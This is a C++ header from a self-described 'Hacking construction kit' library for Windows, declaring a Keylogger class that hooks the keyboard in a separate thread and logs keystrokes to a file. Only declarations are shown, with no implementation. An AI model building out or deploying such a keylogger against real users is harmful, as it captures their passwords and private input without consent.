/*
 * Hacking construction kit -- A GPL Windows security library.
 * While this library can potentially be used for nefarious purposes, 
 * it was written for educational and recreational
 * purposes only and the author does not endorse illegal use.
 *
 * This library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 *
 * You should have received a copy of the GNU General Public License
 * along with this library.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Author: thirdstormofcythraul@outlook.com
 */
#pragma once

#include <string>

#include <Windows.h>

/**
* A simple key logger.
* It create a new thread and hook keyboard handler.
*/
class Keylogger {
public:
	// Start the keylogger and save in filename
	static bool startKeylogger(const char *filename);

	// Stop the keylogger.
	static bool stopKeylogger();

	// The thread used for keylog
	static DWORD WINAPI keyLogger(LPVOID lpParameter);	

	static void msgLoop();

	static std::string filename;

	static HANDLE hThread;
};